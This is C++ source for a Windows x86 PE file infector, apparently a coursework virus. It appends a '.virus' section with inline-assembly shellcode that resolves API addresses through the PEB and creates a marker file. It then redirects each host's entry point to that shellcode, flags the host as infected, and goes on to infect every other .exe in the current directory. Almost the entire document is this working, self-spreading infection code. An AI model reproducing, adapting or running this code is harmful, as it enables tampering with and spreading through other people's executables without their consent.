

#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <windows.h>
#include <string>
#include <vector>
#include <filesystem>

namespace fs = std::filesystem;

#define INFECT_FLAG_1 0x1234
#define INFECT_FLAG_2 0x5566
#define INFECT_SEC_NAME ".virus"

using namespace std;


class Parser {
public:
    explicit Parser(BYTE* fData) {
        fileData = fData;
    }

    PIMAGE_DOS_HEADER getDOSHeader() {
        auto dos = (PIMAGE_DOS_HEADER)fileData;
        if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
            return nullptr;
        }
        return dos;
    }

    PIMAGE_NT_HEADERS getNTHeader() {
        auto dos = getDOSHeader();
        if (dos == nullptr) {
            return nullptr;
        }
        auto nt = (PIMAGE_NT_HEADERS)(dos->e_lfanew + (SIZE_T)fileData);
        if (nt->Signature != IMAGE_NT_SIGNATURE) {
            return nullptr;
        }
        return nt;
    }

    PIMAGE_FILE_HEADER getFileHeader() {
        auto nt = getNTHeader();
        if (nt == nullptr) {
            return nullptr;
        }
        auto header = &(nt->FileHeader);
        return header;
    }

    PIMAGE_OPTIONAL_HEADER getOptHeader() {
        auto nt = getNTHeader();
        if (nt == nullptr) {
            return nullptr;
        }
        auto header = &(nt->OptionalHeader);
        return header;
    }

    PIMAGE_SECTION_HEADER getNewSectionLoc() {
        auto numOfSec = getFileHeader()->NumberOfSections;
        if (numOfSec == 0) {
            return nullptr;
        }

        auto firstSec = IMAGE_FIRST_SECTION(getNTHeader());
        // the last section is 1stSec + numOfSec - 1, so here returns the new location
        auto sec = firstSec + numOfSec;

        // if ((sec->Characteristics != 0) || (sec->Name[0] != 0) || (sec->SizeOfRawData != 0)) {
        //     return nullptr;
        // }
        return sec;
    }

    static SIZE_T secAlign(SIZE_T size, SIZE_T align) {
        // align in this way
        return (size % align == 0) ? size : (size / align + 1) * align;
    }

private:
    BYTE* fileData;
};


class Modifier {
public:
    explicit Modifier(LPCSTR fName) {
        fileName = fName;
        if (!createHandleAndMap()) {
            cout << "[ERROR]Initialize failed." << endl;
            exit(-1);
        }
    }

    BOOL createHandleAndMap() {
        // create file handle
        hFile = CreateFileA(fileName,
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ,
            nullptr,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            nullptr);

        if (hFile == INVALID_HANDLE_VALUE) {
            cout << "[OpenError]Open file failed." << endl;
            return FALSE;
        }

        fSize = GetFileSize(hFile, nullptr);
        cout << "File size: " << fSize << endl;

        // create file handle mapping
        hMap = CreateFileMappingA(hFile,
            nullptr,
            PAGE_READWRITE | SEC_COMMIT,
            0,
            0,
            nullptr);
        if (hMap == nullptr) {
            cout << "[MappingError]Mapping failed." << endl;
            CloseHandle(hFile);
            return FALSE;
        }

        // create map view
        pvFile = MapViewOfFile(hMap,
            FILE_MAP_READ | FILE_MAP_WRITE,
            0,
            0,
            0);
        if (pvFile == nullptr) {
            cout << "[MappingError]Pointer mapping failed." << endl;
            CloseHandle(hMap);
            CloseHandle(hFile);
            return FALSE;
        }

        cout << "[SUCCESS]Handling success." << endl;
        fStart = (BYTE*)pvFile;

        // initialize the parser
        parser = new Parser(fStart);
        if (parser->getFileHeader() == nullptr) {
            cout << "[ParseError]Failed to parse the PE file." << endl;
            closeAllHandles();
            return FALSE;
        }

        // check if the file type is x86 (i386)
        if (parser->getFileHeader()->Machine != IMAGE_FILE_MACHINE_I386) {
            cout << "[OnlySupportX86Error]Infector only supports x86 programs." << endl;
            closeAllHandles();
            return FALSE;
        }

        cout << endl << "#----File Info----#" << endl;
        cout << "File name: " << fileName << endl;
        cout << "NT header bias: " << (SIZE_T)parser->getNTHeader() - (SIZE_T)fStart << endl;
        cout << "File header bias: " << (SIZE_T)parser->getFileHeader() - (SIZE_T)fStart << endl;
        cout << "Optional header bias: " << (SIZE_T)parser->getOptHeader() - (SIZE_T)fStart << endl;
        cout << "#-------End-------#" << endl << endl;

        return TRUE;
    }

    BOOL addNewSector() {
        if (parser == nullptr) {
            return FALSE;
        }

        // if infected, return
        if (isInfected()) {
            cout << "[INFECTED]The target is already infected." << endl;
            return FALSE;
        }

        // save the new section header and find location
        auto newSec = new IMAGE_SECTION_HEADER;
        auto newSecLoc = parser->getNewSectionLoc();

        if (newSecLoc == nullptr) {
            return FALSE;
        }

        // get the alignment and old entry point
        auto secAli = parser->getOptHeader()->SectionAlignment;
        auto fileAli = parser->getOptHeader()->FileAlignment;
        auto oldEntryPt = parser->getOptHeader()->AddressOfEntryPoint;

        // save start point and end point of SHELLCODE into these two vars
        // when complied, what they pointed (__asm block) will become the Machine Code
        // so we can use these two positions to get the SHELLCODE content
        DWORD start, end;
        if (!newSectorContent(oldEntryPt, start, end)) {
            return FALSE;
        }

        // size of SHELLCODE and old entry point
        DWORD newSecSize = end - start + sizeof(DWORD);

        // fix the new section header
        // every members' concept can be easily recognized by those names
        // some members have to align
        strncpy((char*)newSec->Name, INFECT_SEC_NAME, 7);
        newSec->Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;
        newSec->PointerToRawData = (newSecLoc - 1)->PointerToRawData + (newSecLoc - 1)->SizeOfRawData;
        newSec->SizeOfRawData = Parser::secAlign(newSecSize, fileAli);
        newSec->Misc.VirtualSize = newSecSize;
        newSec->VirtualAddress = (newSecLoc - 1)->VirtualAddress +
            Parser::secAlign((newSecLoc - 1)->SizeOfRawData, secAli);

        cout << endl << ">>>New section info:<<<" << endl;
        cout << "Characteristics: 0x" << hex << newSec->Characteristics << endl;
        cout << "Pointer to raw: 0x" << hex << newSec->PointerToRawData << endl;
        cout << "Size of raw: 0x" << hex << newSec->SizeOfRawData << endl;
        cout << "Virtual size: 0x" << hex << newSec->Misc.VirtualSize << endl;
        cout << "Virtual address: 0x" << hex << newSec->VirtualAddress << endl;
        cout << ">>>End<<<" << endl << endl;

        // copy the new section head into the new section location
        memcpy(newSecLoc, newSec, sizeof(IMAGE_SECTION_HEADER));

        // fix the head info
        // every members' concept can be easily recognized by those names
        // some members have to align
        parser->getFileHeader()->NumberOfSections++;
        parser->getOptHeader()->SizeOfImage += newSec->SizeOfRawData;
        parser->getOptHeader()->SizeOfCode += Parser::secAlign(newSecSize, secAli);
        parser->getOptHeader()->AddressOfEntryPoint = newSec->VirtualAddress + sizeof(DWORD);

        // write-in the infect flag
        // I use the reserve WORD 'e_res2' to write
        parser->getDOSHeader()->e_res2[0] = INFECT_FLAG_1;
        parser->getDOSHeader()->e_res2[1] = INFECT_FLAG_2;

        // backup the data after the new section
        DWORD bakPt = newSec->PointerToRawData;
        auto endPt = SetFilePointer(hFile, 0, nullptr, FILE_END);
        auto bakSize = endPt - bakPt;
        auto backup = new BYTE[bakSize];

        // copy the backup data to 'backup' array
        memcpy(backup, bakPt + fStart, bakSize);

        // get the new section content, then copy them to new array
        auto newSecData = new BYTE[newSec->SizeOfRawData];
        ZeroMemory(newSecData, newSec->SizeOfRawData);
        memcpy(newSecData, &oldEntryPt, sizeof(DWORD));
        memcpy(newSecData + sizeof(DWORD), (BYTE*)start, end - start);

        // write-in the new section data, then write-in the backup data
        // firstly need to set the file-pointer to backup-pointer
        DWORD dNum = 0;
        SetFilePointer(hFile, (long)bakPt, nullptr, FILE_BEGIN);
        WriteFile(hFile, newSecData, newSec->SizeOfRawData, &dNum, nullptr);
        WriteFile(hFile, backup, bakSize, &dNum, nullptr);

        // flush buffer and close handles
        FlushFileBuffers(hFile);
        delete[] newSecData;
        delete[] backup;
        closeAllHandles();

        cout << "[SUCCESS]Infected successfully." << endl;
        return TRUE;
    }

    BOOL newSectorContent(DWORD oep, DWORD& start, DWORD& end) {
        if (parser == nullptr) {
            return FALSE;
        }

        // new segment pointer, pointing the SHELLCODE
        DWORD codeStart, codeEnd;
        DWORD oldEntry = oep;           // old entry address, will be written in base - 4



        __asm {
            pushad

            mov eax, inner
            mov codeStart, eax; save the start to var 'codeStart'
            mov eax, outer
            mov codeEnd, eax; save the end to var 'codeEnd'

            jmp outer; directly go to the end of SHELLCODE

            inner :
            call addr_kernel


                addr_kernel :
            ; find addr of kernel base
                mov eax, fs: [30h]
                mov eax, [eax + 0ch]
                mov eax, [eax + 1ch]
                mov eax, [eax]
                mov eax, [eax + 08h]
                push eax

                mov edi, eax
                mov eax, [edi + 3ch]
                mov edx, [edi + eax + 78h]
                add edx, edi
                mov ecx, [edx + 18h]
                mov ebx, [edx + 20h]
                add ebx, edi

                ; find addr of func 'GetProcAddress'
                finder_GPA:
                dec ecx
                mov esi, [ebx + ecx * 4]
                add esi, edi
                mov eax, 'PteG'
                cmp[esi], eax
                jne finder_GPA
                mov eax, 'Acor';
                cmp[esi + 4], eax
                jne finder_GPA

                mov ebx, [edx + 24h]
                add ebx, edi
                mov cx, [ebx + ecx * 2]
                mov ebx, [edx + 1ch]
                add ebx, edi
                mov eax, [ebx + ecx * 4]
                add eax, edi
                push eax

                ; find addr of func 'LoadLibraryExA'
                mov ebx, esp
                push 00004178h
                push 'Eyra'
                push 'rbiL'
                push 'daoL'
                push esp
                push[ebx + 4]
                call[ebx]
                mov esp, ebx
                push eax

                ; load the lib 'Kernel32.dll'
                mov ebx, esp
                push 0
                push 'lld.'
                push '23le'
                push 'nreK'
                mov edx, esp
                push 10h
                push 0
                push edx
                call[ebx]
                mov esp, ebx
                push eax

                ; find addr of func 'CreateFileA'
                mov ebx, esp
                push 0041656ch
                push 'iFet'
                push 'aerC'
                push esp
                push[ebx]
                call[ebx + 8]
                mov esp, ebx
                push eax

                ; create the cxfile
                mov ebx, esp
                push 00007478h
                push 't.  '
                push 'ixne'
                push 'hc-1'
                push '8018'
                push '1203'
                push '0202'
                mov edx, esp
                push 0
                push 80h
                push 2h
                push 0
                push 0
                push 40000000h
                push edx; file name
                call[ebx]
                mov esp, ebx
               
                pop eax
                pop eax
                pop eax
                pop eax
                pop eax
         
                pop edi
                sub edi, 5

                push eax
                mov eax, fs: [30h]
                mov eax, dword ptr[eax + 8]
                add eax, [edi - 4]          ;返回原来的入口
                mov edi, eax
                pop eax
                jmp edi

                outer :
            popad
                nop

        }

        cout << "Code start: 0x" << hex << codeStart << endl;
        cout << "Code end: 0x" << hex << codeEnd << endl;
        cout << "Code length: 0x" << hex << codeEnd - codeStart << endl;

        start = codeStart;
        end = codeEnd;
        return TRUE;
    }

    BOOL isInfected() {
        if (parser == nullptr) {
            return FALSE;
        }
        // if infect flag is written-in, return true
        if (parser->getDOSHeader()->e_res2[0] == INFECT_FLAG_1 &&
            parser->getDOSHeader()->e_res2[1] == INFECT_FLAG_2) {
            return TRUE;
        }

        return FALSE;
    }

    void closeAllHandles() {
        UnmapViewOfFile(pvFile);
        CloseHandle(hMap);
        CloseHandle(hFile);
    }

private:
    LPCSTR fileName;
    HANDLE hFile = nullptr, hMap = nullptr;
    DWORD fSize = 0;
    PVOID pvFile = nullptr;
    BYTE* fStart = nullptr;
    Parser* parser = nullptr;
};

int main(int argc, char** argv) {
    const char* fileName;

    // 如果目标程序存在，则感染目标程序
    if (argc == 1) {
        fileName = "try.exe";
    }
    else {
        fileName = argv[1];
    }

    auto modifier = Modifier(fileName);
    modifier.addNewSector();

    // 查找并感染同目录下的其他PE格式的.exe文件
    const std::string path = ".";
    std::vector<std::string> exeFiles;

    for (const auto& entry : fs::directory_iterator(path)) {
        if (entry.is_regular_file() && entry.path().extension() == ".exe") {
            exeFiles.emplace_back(entry.path().filename().string());
        }
    }

    // 将文件名写入数组中
    std::vector<const char*> exeFileNames(exeFiles.size());
    for (size_t i = 0; i < exeFiles.size(); i++) {
        exeFileNames[i] = exeFiles[i].c_str();
        //  if(exeFileNames[i] !="try.exe")
          //    auto modifier = Modifier(exeFileNames[i]);
            //  modifier.addNewSector();
    }

    // 输出数组中的文件名
    std::cout << "Found " << exeFiles.size() << " exe files:" << std::endl;
    for (const auto& fileName : exeFileNames) {
        std::cout << fileName << std::endl;
    }
    //感染其它PE文件

    for (const auto& fileName : exeFileNames) {
        if (fileName != "blank.exe")
        {
            auto modifier = Modifier(fileName);
            modifier.addNewSector();
        }
    }

    return 0;
}
